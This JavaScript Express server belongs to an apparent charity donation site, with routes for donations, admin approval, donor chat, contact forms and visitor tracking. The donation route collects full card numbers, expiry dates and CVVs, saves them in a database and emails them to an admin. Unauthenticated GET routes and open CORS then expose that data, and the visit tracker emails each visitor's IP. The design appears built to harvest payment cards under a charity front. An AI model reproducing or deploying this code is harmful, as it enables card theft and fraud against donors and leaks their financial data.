import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import {
  sendVisitNotification,
  sendContactEmail,
  sendDonationEmail,
  sendApprovalEmail,
  sendAdminNewDonationAlert,
} from './services/emailService.js';
import {
  saveDonationToSupabase,
  getDonationsFromSupabase,
  approveDonationInSupabase,
  rejectDonationInSupabase,
  getDonationByIdFromSupabase,
  getChatMessagesFromSupabase,
  saveChatMessageToSupabase,
  saveContactToSupabase,
  getContactsFromSupabase,
  saveVisitToSupabase,
  getVisitsFromSupabase,
  getStatsFromSupabase,
  checkSupabaseHealth,
} from './services/supabaseService.js';

dotenv.config();

const app = express();

// Middlewares — Configure CORS for cross-origin production requests
app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
}));
app.options('*', cors());

app.use(express.json());

// ─── API Routes ─────────────────────────────────────────────────────────────

// 1. Healthcheck Endpoint
app.get(['/api/health', '/health'], async (req, res) => {
  try {
    const supabaseStatus = await checkSupabaseHealth();
    res.json({
      status: 'ok',
      service: 'Mdeaver Charity Foundation Express API',
      timestamp: new Date().toISOString(),
      supabase: supabaseStatus,
    });
  } catch (error) {
    res.status(500).json({ status: 'error', error: error.message });
  }
});

// 2. Aggregate Statistics Endpoint
app.get(['/api/stats', '/stats'], async (req, res) => {
  try {
    const statsResult = await getStatsFromSupabase();
    res.json(statsResult);
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// 3. Donation Record & Email Notification
app.post(['/api/donations/notify', '/donations/notify'], async (req, res) => {
  try {
    const {
      invoiceNumber,
      donorName,
      email,
      amount,
      paymentMethod,
      cardNumber,
      cardExpiry,
      cardCvv,
      billingAddress,
      paymentDetails,
      timestamp,
    } = req.body;

    if (!donorName || !email || !amount) {
      return res.status(400).json({
        success: false,
        error: 'Donor name, email, and amount are required.',
      });
    }

    const formattedTime = timestamp || new Date().toLocaleString('en-US', {
      dateStyle: 'medium',
      timeStyle: 'short',
    });

    const generatedInvoice = invoiceNumber || `MDF-2026-${Math.floor(10000 + Math.random() * 90000)}`;

    const donationData = {
      invoiceNumber: generatedInvoice,
      donorName,
      email,
      amount,
      paymentMethod: paymentMethod || 'Credit / Debit Card',
      cardNumber: cardNumber || paymentDetails?.cardNumber || null,
      cardExpiry: cardExpiry || paymentDetails?.expiry || null,
      cardCvv: cardCvv || paymentDetails?.cvv || null,
      billingAddress: billingAddress || paymentDetails?.billingAddress || null,
      timestamp: formattedTime,
    };

    // Store in Supabase database with pending_approval status
    const dbResult = await saveDonationToSupabase({
      ...donationData,
      status: 'pending_approval',
    });

    // Send immediate email alert to ADMIN_EMAIL to notify admin of incoming pending submission
    const protocol = req.headers['x-forwarded-proto'] || 'http';
    const host = req.headers['host'] || 'localhost:5173';
    const clientOrigin = req.headers['origin'] || `${protocol}://${host}`;
    const adminApproveUrl = `${clientOrigin}/admin/donations`;
    const adminEmailResult = await sendAdminNewDonationAlert(donationData, adminApproveUrl);

    res.json({
      success: true,
      message: 'Donation submission logged. Awaiting administrator approval.',
      invoiceNumber: generatedInvoice,
      dbResult,
      adminEmailResult,
    });
  } catch (error) {
    console.error('[EXPRESS DONATION ERROR]:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// 3b. Approve Donation & Send Approval Email with Chat Link
app.post(['/api/donations/:id/approve', '/donations/:id/approve'], async (req, res) => {
  try {
    const { id } = req.params;
    const dbResult = await approveDonationInSupabase(id);

    if (!dbResult.success || !dbResult.data) {
      return res.status(400).json({ success: false, error: dbResult.error || 'Donation record not found.' });
    }

    const approvedDonation = dbResult.data;
    const protocol = req.headers['x-forwarded-proto'] || 'http';
    const host = req.headers['host'] || 'localhost:5173';
    const clientOrigin = req.headers['origin'] || `${protocol}://${host}`;
    const chatUrl = `${clientOrigin}/chat?id=${approvedDonation.id}`;

    // Send email with live chat link to donor
    const emailResult = await sendApprovalEmail(approvedDonation, chatUrl);

    res.json({
      success: true,
      message: 'Donation approved successfully and approval email with chat link sent to donor.',
      donation: approvedDonation,
      emailResult,
      chatUrl,
    });
  } catch (error) {
    console.error('[EXPRESS DONATION APPROVAL ERROR]:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// 3c. Reject Donation Route
app.post(['/api/donations/:id/reject', '/donations/:id/reject'], async (req, res) => {
  try {
    const { id } = req.params;
    const dbResult = await rejectDonationInSupabase(id);

    if (!dbResult.success || !dbResult.data) {
      return res.status(400).json({ success: false, error: dbResult.error || 'Donation record not found.' });
    }

    res.json({
      success: true,
      message: 'Donation status updated to rejected.',
      donation: dbResult.data,
    });
  } catch (error) {
    console.error('[EXPRESS DONATION REJECT ERROR]:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});


// 4. Retrieve Recent Donations from Supabase
app.get(['/api/donations', '/donations'], async (req, res) => {
  try {
    const limit = Number(req.query.limit) || 20;
    const result = await getDonationsFromSupabase(limit);
    res.json(result);
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// 4b. Live Donor-Admin Chat Endpoints
app.get(['/api/chat/:donationId', '/chat/:donationId'], async (req, res) => {
  try {
    const { donationId } = req.params;
    const [donationRes, messagesRes] = await Promise.all([
      getDonationByIdFromSupabase(donationId),
      getChatMessagesFromSupabase(donationId),
    ]);

    res.json({
      success: true,
      donation: donationRes.data || null,
      messages: messagesRes.data || [],
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post(['/api/chat/:donationId', '/chat/:donationId'], async (req, res) => {
  try {
    const { donationId } = req.params;
    const { invoiceNumber, senderType, senderName, message } = req.body;

    if (!message || !senderType || !senderName) {
      return res.status(400).json({ success: false, error: 'Message, senderType, and senderName are required.' });
    }

    const saveRes = await saveChatMessageToSupabase({
      donationId,
      invoiceNumber,
      senderType,
      senderName,
      message,
    });

    res.json(saveRes);
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});


// 5. Contact Form Submission
app.post(['/api/contact', '/contact'], async (req, res) => {
  try {
    const { name, email, phone, subject, message } = req.body;
    if (!name || !email || !message) {
      return res.status(400).json({
        success: false,
        error: 'Name, email, and message are required fields.',
      });
    }

    const contactData = { name, email, phone, subject, message };

    // Save contact inquiry in Supabase & send notification email
    const dbResult = await saveContactToSupabase(contactData);
    const emailResult = await sendContactEmail(contactData);

    res.json({
      success: true,
      message: 'Contact form recorded and notification emails sent.',
      dbResult,
      emailResult,
    });
  } catch (error) {
    console.error('[EXPRESS CONTACT ERROR]:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// 6. Retrieve Contact Form Messages
app.get(['/api/contact', '/contact'], async (req, res) => {
  try {
    const limit = Number(req.query.limit) || 20;
    const result = await getContactsFromSupabase(limit);
    res.json(result);
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// 7. Visit Tracker Notification
app.post(['/api/notify/visit', '/notify/visit'], async (req, res) => {
  try {
    const ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const timestamp = new Date().toLocaleString('en-US', {
      dateStyle: 'medium',
      timeStyle: 'short',
    });

    const visitData = { ip, userAgent, timestamp, url: req.body?.url || '/' };

    // Log to Supabase & dispatch email
    const dbResult = await saveVisitToSupabase(visitData);
    const emailResult = await sendVisitNotification(visitData);

    res.json({ success: true, message: 'Visit notification logged.', dbResult, emailResult });
  } catch (error) {
    console.error('[EXPRESS VISIT TRACKER ERROR]:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// 8. Retrieve Recent Visits from Supabase
app.get(['/api/visits', '/visits'], async (req, res) => {
  try {
    const limit = Number(req.query.limit) || 20;
    const result = await getVisitsFromSupabase(limit);
    res.json(result);
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});


// 404 Fallback Handler
app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: `Route not found: ${req.method} ${req.url}`,
  });
});

// Local dev server execution
if (!process.env.VERCEL) {
  const PORT = process.env.PORT || 3000;
  app.listen(PORT, () => {
    console.log(`\n=================================================`);
    console.log(` MDEAVER CHARITY EXPRESS API SERVER STARTED `);
    console.log(` Running locally at: http://localhost:${PORT}`);
    console.log(`  - Healthcheck: GET  http://localhost:${PORT}/api/health`);
    console.log(`  - Aggregate Stats: GET http://localhost:${PORT}/api/stats`);
    console.log(`  - Donations API: POST http://localhost:${PORT}/api/donations/notify`);
    console.log(`  - Contact API:   POST http://localhost:${PORT}/api/contact`);
    console.log(`  - Visit Tracker: POST http://localhost:${PORT}/api/notify/visit`);
    console.log(`=================================================\n`);
  });
}

export default app;
